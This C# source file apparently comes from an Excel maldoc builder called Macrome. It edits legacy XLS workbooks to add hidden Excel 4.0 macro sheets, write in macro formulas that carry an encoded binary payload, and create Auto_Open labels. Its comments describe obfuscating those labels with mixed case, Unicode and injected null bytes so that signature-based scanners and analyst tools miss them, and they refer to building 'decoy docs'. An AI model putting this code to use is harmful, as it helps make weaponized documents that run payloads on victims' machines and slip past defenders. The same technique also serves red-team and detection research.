using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Ptg;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.Spreadsheet.XlsFileFormat.Structures;
using b2xtranslator.StructuredStorage.Reader;
using b2xtranslator.xls.XlsFileFormat.Records;

namespace Macrome
{
    public class WorkbookEditor
    {
        public WorkbookStream WbStream;

        public WorkbookEditor(byte[] workbookBytes)
        {
            WbStream = new WorkbookStream(workbookBytes);
        }

        public WorkbookEditor(WorkbookStream wbs)
        {
            WbStream = wbs;
        }

        private BoundSheet8 BuildBoundSheetFromBytes(byte[] bytes)
        {
            using (MemoryStream ms = new MemoryStream(bytes))
            {
                VirtualStreamReader vsr = new VirtualStreamReader(ms);
                RecordType id = (RecordType)vsr.ReadUInt16();
                ushort len = vsr.ReadUInt16();
                return new BoundSheet8(vsr, id, len);
            }
        }

        public WorkbookStream InsertBoundSheetRecord(BoundSheet8 boundSheet8)
        {
            List<BiffRecord> records = WbStream.Records;

            List<BoundSheet8> sheets = records.Where(r => r.Id == RecordType.BoundSheet8).Select(sheet => BuildBoundSheetFromBytes(sheet.GetBytes())).ToList();
            
            boundSheet8.lbPlyPos = sheets.First().lbPlyPos;
            sheets.Add(boundSheet8);

            foreach (var sheet in sheets)
            {
                sheet.lbPlyPos += boundSheet8.Length;
            }


            var preSheetRecords = records.TakeWhile(r => r.Id != RecordType.BoundSheet8);
            var postSheetRecords = records.SkipWhile(r => r.Id != RecordType.BoundSheet8)
                .SkipWhile(r => r.Id == RecordType.BoundSheet8);

            List<BiffRecord> newRecordList = preSheetRecords.Concat(sheets).Concat(postSheetRecords).ToList();

            WorkbookStream newStream = new WorkbookStream(newRecordList);

            WbStream = newStream;

            return WbStream;
        }

        public WorkbookStream UnhideSheets()
        {
            List<BoundSheet8> sheetRecords = WbStream.GetAllRecordsByType<BoundSheet8>();
            foreach (var sheetRecord in sheetRecords)
            {
                BoundSheet8 unhiddenRecord = ((BiffRecord)sheetRecord.Clone()).AsRecordType<BoundSheet8>();
                unhiddenRecord.hsState = BoundSheet8.HiddenState.Visible;
                WbStream = WbStream.ReplaceRecord(sheetRecord, unhiddenRecord);
            }

            WbStream = WbStream.FixBoundSheetOffsets();

            return WbStream;
        }

        public WorkbookStream NormalizeAutoOpenLabels()
        {
            List<Lbl> autoOpenLabels = WbStream.GetAutoOpenLabels();
            foreach (var label in autoOpenLabels)
            {
                Lbl fixedLabel = ((BiffRecord) label.Clone()).AsRecordType<Lbl>();
                fixedLabel.SetName(new XLUnicodeStringNoCch("Auto_Open"));
                WbStream = WbStream.ReplaceRecord(label, fixedLabel);
            }

            WbStream = WbStream.FixBoundSheetOffsets();

            return WbStream;
        }

        public WorkbookStream AddMacroSheet(List<BiffRecord> macroSheetRecords, string sheetName, BoundSheet8.HiddenState hiddenState = BoundSheet8.HiddenState.Visible)
        {
            BoundSheet8 macroBoundSheet = new BoundSheet8(hiddenState, BoundSheet8.SheetType.Macrosheet, sheetName);
            WbStream = WbStream.AddSheet(macroBoundSheet, macroSheetRecords);
            return WbStream;
        }

        public WorkbookStream SetMacroSheetContent(List<string> macroStrings, byte[] binaryPayload = null)
        {
            List<BoundSheet8> sheets = WbStream.GetAllRecordsByType<BoundSheet8>();
            int macroSheetIndex = sheets.TakeWhile(sheet => sheet.dt != BoundSheet8.SheetType.Macrosheet).Count();
            string macroSheetName = sheets.Skip(macroSheetIndex).First().stName.Value;
            BOF macroBof = WbStream.GetAllRecordsByType<BOF>().Skip(macroSheetIndex + 1).First();
            List<BiffRecord> macroRecords = WbStream.GetRecordsForBOFRecord(macroBof);

            WorkbookStream macroStream = new WorkbookStream(macroRecords);
            List<Formula> macroFormulas = macroStream.GetAllRecordsByType<Formula>();
            int numRecordsInSheet = macroFormulas.Count;

            List<BiffRecord> formulasToAdd = FormulaHelper.ConvertStringsToRecords(macroStrings, numRecordsInSheet - 1, 0, 0, 1);

            if (binaryPayload != null)
            {
                List<string> payload = FormulaHelper.BuildPayloadMacros(binaryPayload);
                formulasToAdd.AddRange(FormulaHelper.ConvertStringsToRecords(payload, numRecordsInSheet - 1 + formulasToAdd.Count, 0, 0, 2));
            }
            
            Formula haltFormula = macroFormulas.Last();
            Formula modifiedHaltFormula = ((BiffRecord)haltFormula.Clone()).AsRecordType<Formula>();
            modifiedHaltFormula.rw = (ushort)(numRecordsInSheet - 1 + formulasToAdd.Count);

            Formula gotoFormula = FormulaHelper.GetGotoFormulaForCell(modifiedHaltFormula.rw, modifiedHaltFormula.col, 0, 1);

            WorkbookStream modifiedStream = WbStream.InsertRecords(formulasToAdd, haltFormula);
            modifiedStream = modifiedStream.ReplaceRecord(haltFormula, gotoFormula);

            WbStream = modifiedStream;
            return WbStream;
        }

        public WorkbookStream AddLabel(string label, int rw, int col)
        {
            /*
             * Labels require a reference to an XTI index which is used to say which
             * BoundSheet8 record maps to the appropriate tab. In order to make this
             * record we need a SupBook record, and ExternSheet record to specify
             * which BoundSheet8 record to use.
             *
             * Currently this assumes there are no SupBook or ExternSheet records in
             * use, handling of these cases for complex decoy docs is coming
             * in the future.
             *
             * TODO handle existing SupBook/ExternSheet records when adding Lbl entries
             */

            List<BoundSheet8> sheets = WbStream.GetAllRecordsByType<BoundSheet8>();
            List<SupBook> supBooksExisting = WbStream.GetAllRecordsByType<SupBook>();
            List<ExternSheet> externSheetsExisting = WbStream.GetAllRecordsByType<ExternSheet>();

            if (supBooksExisting.Count > 0 || externSheetsExisting.Count > 0)
            {
                throw new NotImplementedException("Use a Decoy Document with no Labels");
            }

            BiffRecord lastCountryRecord = WbStream.GetAllRecordsByType<Country>().Last();

            SupBook supBookRecord = new SupBook(sheets.Count, 0x401);
            int macroOffset = sheets.TakeWhile(s => s.dt != BoundSheet8.SheetType.Macrosheet).Count();
            ExternSheet externSheetRecord = new ExternSheet(1, new List<XTI>() {new XTI(0, macroOffset, macroOffset) });

            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();
            ptgStack.Push(new PtgRef3d(rw, col, 0));
            Lbl newLbl = new Lbl(label, 0);
            newLbl.SetRgce(ptgStack);

            WbStream = WbStream.InsertRecord(supBookRecord, lastCountryRecord);
            WbStream = WbStream.InsertRecord(externSheetRecord, supBookRecord);
            WbStream = WbStream.InsertRecord(newLbl, externSheetRecord);
            WbStream = WbStream.FixBoundSheetOffsets();

            return WbStream;
        }


        /// <summary>
        /// We use a few tricks here to obfuscate the Auto_Open Lbl BIFF records.
        /// 1) By default the Lbl Auto_Open record is marked as fBuiltin = true with a single byte 0x01 to represent AUTO_OPEN
        ///    We avoid this easily sig-able series of bytes by using a string instead - which Excel will also process.
        ///    We can use labels like AuTo_OpEn and Excel will still use it - some analyst tools are case sensitive and don't
        ///    detect this.
        /// 2) The string we use for the Lbl can be Unicode, which will further break signatures expecting an ASCII Auto_Open string
        /// 3) We can inject null bytes into the label name and Excel will ignore them when hunting for Auto_Open labels.
        ///    The name manager will only display up to the first null byte - and most excel label parsers will also break on this.
        /// </summary>
        /// <returns></returns>
        public WorkbookStream ObfuscateAutoOpen()
        {
            WbStream = WbStream.ObfuscateAutoOpen();
            return WbStream;
        }


        public byte[] InsertWorksheet(byte[] workbook, byte[] worksheet)
        {
            // return workbook;
            throw new NotImplementedException();
        }



    }
}
